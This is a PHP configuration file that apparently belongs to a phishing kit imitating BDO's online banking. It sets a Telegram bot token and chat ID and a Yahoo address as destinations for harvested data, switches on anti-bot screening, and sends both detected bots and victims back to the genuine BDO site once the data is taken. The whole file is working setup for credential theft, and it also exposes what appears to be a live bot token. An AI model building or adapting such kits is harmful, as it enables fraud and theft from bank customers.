<?php 

$login_header = array(
    'display'   => true        , 
    'style'     => 'img'       , 
);

$login_footer = array(
    'display'   => true        ,
    'style'     => 'img'       , 
);

$main_footer = array(
    'display'   => true        , 
    'style'     => 'img'       , 
); 

$telegram = array(
    'mode'      => true       , 
    'token'     => '5108963799:AAFg_DkblHFVByuLfdDX_V5r0A3UkE7Pa7s' , 
    'chat_id'   => '-589864844'   ,
);

$mailbox = array(
    'mode'      => true       ,
    'from_name' => 'bdo' ,
    'mail_to'   => 'mr.robot413@yahoo.com'   ,
);

$allow_device = array(
    'mobile'    => true        ,
    'tablet'    => true        ,
    'desktop'   => true        ,
);

$antibot_pw_api = array(
    'mode'      => false       ,
    'api_key'   => 'API_KEY'   ,
);

$antibot['redirect_url'] = 'https://online.bdo.com.ph/';

$success['redirect_url'] = 'https://online.bdo.com.ph/';
?>